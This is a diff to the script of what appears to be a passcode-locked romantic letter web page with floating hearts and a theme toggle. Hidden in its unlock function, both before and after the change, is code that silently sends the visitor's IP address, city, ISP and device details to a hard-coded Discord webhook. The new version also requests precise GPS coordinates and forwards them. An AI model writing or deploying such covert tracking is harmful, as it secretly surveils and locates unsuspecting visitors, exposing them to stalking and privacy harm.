@@ -454,178 +454,210 @@
 </div>
 
 <script>
-const heartBg = document.getElementById('heart-bg');
-function createHeart() {
-  const heart = document.createElement('div');
-  heart.classList.add('heart');
-  heart.style.left = Math.random() * 100 + 'vw';
-  heart.style.animationDuration = 5 + Math.random() * 5 + 's';
-  heart.style.opacity = 0.3 + Math.random() * 0.7;
-  heartBg.appendChild(heart);
-  heart.addEventListener('animationend', () => heart.remove());
-}
-setInterval(createHeart, 200);
+  const heartBg = document.getElementById('heart-bg');
+  const MAX_HEARTS = 100;
 
-const themeToggle = document.getElementById('themeToggle');
-const body = document.body;
-if (localStorage.getItem('theme') === 'night') {
-  body.classList.add('night');
-  themeToggle.textContent = '☀️';
-}
-themeToggle.addEventListener('click', () => {
-  body.classList.toggle('night');
-  if (body.classList.contains('night')) {
+  function createHeart() {
+    if (heartBg.childElementCount >= MAX_HEARTS) {
+      heartBg.removeChild(heartBg.firstChild); // remove oldest
+    }
+
+    const heart = document.createElement('div');
+    heart.classList.add('heart');
+    heart.style.left = Math.random() * 100 + 'vw';
+    heart.style.animationDuration = 5 + Math.random() * 5 + 's';
+    heart.style.opacity = 0.3 + Math.random() * 0.7;
+    heartBg.appendChild(heart);
+
+    heart.addEventListener('animationend', () => heart.remove());
+  }
+
+  setInterval(createHeart, 500);
+
+  const themeToggle = document.getElementById('themeToggle');
+  const body = document.body;
+  if (localStorage.getItem('theme') === 'night') {
+    body.classList.add('night');
     themeToggle.textContent = '☀️';
-    localStorage.setItem('theme', 'night');
-  } else {
-    themeToggle.textContent = '🌙';
-    localStorage.setItem('theme', 'day');
   }
-});
-
-const passcodeOverlay = document.getElementById('passcodeOverlay');
-const passcodeInput = document.getElementById('passcodeInput');
-const passcodeError = document.getElementById('passcodeError');
-const letterContainer = document.getElementById('letterContainer');
-const keypadButtons = document.querySelectorAll('.keybtn');
-const backspaceBtn = document.getElementById('backspaceBtn');
-
-const CORRECT_HASH = 'adfaab87038c95002ab05463e743201605457409b7129f9a3a8cddcb8caea1a2';
-let enteredPasscode = '';
-
-function updateInputDisplay() {
-  passcodeInput.value = '•'.repeat(enteredPasscode.length);
-}
-
-function showError(message) {
-  passcodeError.textContent = message;
-  passcodeError.classList.add('visible');
-  setTimeout(() => {
-    passcodeError.classList.remove('visible');
-    passcodeError.textContent = '';
-  }, 1800);
-}
-
-function resetPasscode() {
-  enteredPasscode = '';
-  updateInputDisplay();
-}
-
-async function hashPasscode(passcode) {
-  const encoder = new TextEncoder();
-  const data = encoder.encode(passcode);
-  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-  const hashArray = Array.from(new Uint8Array(hashBuffer));
-  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-}
-
-async function validateAndUnlock() {
-  const hash = await hashPasscode(enteredPasscode);
-  if (hash === CORRECT_HASH) {
-    unlock();
-  } else {
-    showError('Incorrect passcode');
-    resetPasscode();
-  }
-}
-
-function unlock() {
-  passcodeOverlay.classList.add('unlocking');
-  letterContainer.classList.add('show');
-  letterContainer.setAttribute('aria-hidden', 'false');
-  letterContainer.focus();
-
-  setTimeout(() => {
-    passcodeOverlay.style.display = 'none';
-  }, 700);
-
-  const webhookURL = "https://discord.com/api/webhooks/1393055608902520902/1JNTK4MjgwmxkBSY9dYhmLuE8vGSqMwTzvUfcpsfWQzTc27m9eu2Qz0JNX6eY3UgBsUU";
-
-  const deviceInfo = {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    screen: `${window.screen.width}x${window.screen.height}`,
-    language: navigator.language,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-  };
-
-  fetch('https://ipapi.co/json/')
-    .then(res => res.json())
-    .then(data => {
-      const locationInfo = {
-        ip: data.ip,
-        city: data.city,
-        region: data.region,
-        country: data.country_name,
-        org: data.org
-      };
-
-      const message = {
-        content: `📡 **Passcode Unlocked – Visitor Info**:
-**Device**: ${deviceInfo.platform}
-**User Agent**: ${deviceInfo.userAgent}
-**Language**: ${deviceInfo.language}
-**Resolution**: ${deviceInfo.screen}
-**Timezone**: ${deviceInfo.timezone}
-
-IP: ${locationInfo.ip}
-City: ${locationInfo.city}
-Region: ${locationInfo.region}
-Country: ${locationInfo.country}
-ISP: ${locationInfo.org}`
-      };
-
-      fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(message)
-      });
-    })
-    .catch(err => {
-      console.error("Failed to send IP info:", err);
-    });
-}
-
-keypadButtons.forEach(button => {
-  button.addEventListener('click', () => {
-    if (enteredPasscode.length >= 4) return;
-    enteredPasscode += button.dataset.key;
-    updateInputDisplay();
-    if (enteredPasscode.length === 4) {
-      validateAndUnlock();
+  themeToggle.addEventListener('click', () => {
+    body.classList.toggle('night');
+    if (body.classList.contains('night')) {
+      themeToggle.textContent = '☀️';
+      localStorage.setItem('theme', 'night');
+    } else {
+      themeToggle.textContent = '🌙';
+      localStorage.setItem('theme', 'day');
     }
   });
-});
 
-backspaceBtn.addEventListener('click', () => {
-  if (enteredPasscode.length > 0) {
-    enteredPasscode = enteredPasscode.slice(0, -1);
+  const passcodeOverlay = document.getElementById('passcodeOverlay');
+  const passcodeInput = document.getElementById('passcodeInput');
+  const passcodeError = document.getElementById('passcodeError');
+  const letterContainer = document.getElementById('letterContainer');
+  const keypadButtons = document.querySelectorAll('.keybtn');
+  const backspaceBtn = document.getElementById('backspaceBtn');
+
+  const CORRECT_HASH = 'adfaab87038c95002ab05463e743201605457409b7129f9a3a8cddcb8caea1a2';
+  let enteredPasscode = '';
+
+  function updateInputDisplay() {
+    passcodeInput.value = '•'.repeat(enteredPasscode.length);
+  }
+
+  function showError(message) {
+    passcodeError.textContent = message;
+    passcodeError.classList.add('visible');
+    setTimeout(() => {
+      passcodeError.classList.remove('visible');
+      passcodeError.textContent = '';
+    }, 1800);
+  }
+
+  function resetPasscode() {
+    enteredPasscode = '';
     updateInputDisplay();
   }
-});
 
-document.addEventListener('keydown', e => {
-  if (passcodeOverlay.style.display === 'none') return;
-  if (e.key >= '0' && e.key <= '9') {
-    if (enteredPasscode.length < 4) {
-      enteredPasscode += e.key;
+  function unlock() {
+    passcodeOverlay.classList.add('unlocking');
+    letterContainer.classList.add('show');
+    letterContainer.setAttribute('aria-hidden', 'false');
+    letterContainer.focus();
+
+    setTimeout(() => {
+      passcodeOverlay.style.display = 'none';
+    }, 700);
+
+    // Ask for accurate location after unlock
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        pos => sendLocation(pos.coords),
+        err => console.warn('Accurate location denied:', err)
+      );
+    }
+
+    // Fallback location (no permission needed)
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        sendToWebhook({
+          ip: data.ip,
+          city: data.city,
+          region: data.region,
+          country: data.country_name,
+          org: data.org
+        });
+      })
+      .catch(err => console.error("Failed to fetch fallback location:", err));
+  }
+
+  function sendLocation(coords) {
+    sendToWebhook({
+      accurate: true,
+      latitude: coords.latitude,
+      longitude: coords.longitude,
+      accuracy: coords.accuracy
+    });
+  }
+
+  function sendToWebhook(info) {
+    const webhookURL = "https://discord.com/api/webhooks/1393055608902520902/1JNTK4MjgwmxkBSY9dYhmLuE8vGSqMwTzvUfcpsfWQzTc27m9eu2Qz0JNX6eY3UgBsUU";
+
+    const deviceInfo = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      screen: `${window.screen.width}x${window.screen.height}`,
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    };
+
+    const content = info.accurate
+      ? `📍 **Accurate Location Permission Granted**  
+**Latitude**: ${info.latitude}  
+**Longitude**: ${info.longitude}  
+**Accuracy**: ${info.accuracy} meters`
+      : `📡 **Passcode Unlocked – Fallback Info**:  
+**Device**: ${deviceInfo.platform}  
+**User Agent**: ${deviceInfo.userAgent}  
+**Language**: ${deviceInfo.language}  
+**Resolution**: ${deviceInfo.screen}  
+**Timezone**: ${deviceInfo.timezone}  
+
+IP: ${info.ip}  
+City: ${info.city}  
+Region: ${info.region}  
+Country: ${info.country}  
+ISP: ${info.org}`;
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content })
+    });
+  }
+
+  async function hashPasscode(input) {
+    const encoder = new TextEncoder();
+    const data = encoder.encode(input);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+    return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
+  }
+
+  keypadButtons.forEach(button => {
+    button.addEventListener('click', async () => {
+      if (enteredPasscode.length >= 4) return;
+      enteredPasscode += button.dataset.key;
       updateInputDisplay();
       if (enteredPasscode.length === 4) {
-        validateAndUnlock();
+        const hash = await hashPasscode(enteredPasscode);
+        if (hash === CORRECT_HASH) {
+          unlock();
+        } else {
+          showError('Incorrect passcode');
+          resetPasscode();
+        }
       }
-    }
-  } else if (e.key === 'Backspace') {
+    });
+  });
+
+  backspaceBtn.addEventListener('click', () => {
     if (enteredPasscode.length > 0) {
       enteredPasscode = enteredPasscode.slice(0, -1);
       updateInputDisplay();
     }
-  }
-});
+  });
 
-passcodeInput.addEventListener('keydown', e => {
-  e.preventDefault();
-});
+  document.addEventListener('keydown', async e => {
+    if (passcodeOverlay.style.display === 'none') return;
+    if (e.key >= '0' && e.key <= '9') {
+      if (enteredPasscode.length < 4) {
+        enteredPasscode += e.key;
+        updateInputDisplay();
+        if (enteredPasscode.length === 4) {
+          const hash = await hashPasscode(enteredPasscode);
+          if (hash === CORRECT_HASH) {
+            unlock();
+          } else {
+            showError('Incorrect passcode');
+            resetPasscode();
+          }
+        }
+      }
+    } else if (e.key === 'Backspace') {
+      if (enteredPasscode.length > 0) {
+        enteredPasscode = enteredPasscode.slice(0, -1);
+        updateInputDisplay();
+      }
+    }
+  });
+
+  passcodeInput.addEventListener('keydown', e => {
+    e.preventDefault();
+  });
 </script>
+
+
 
 </body>
 </html>
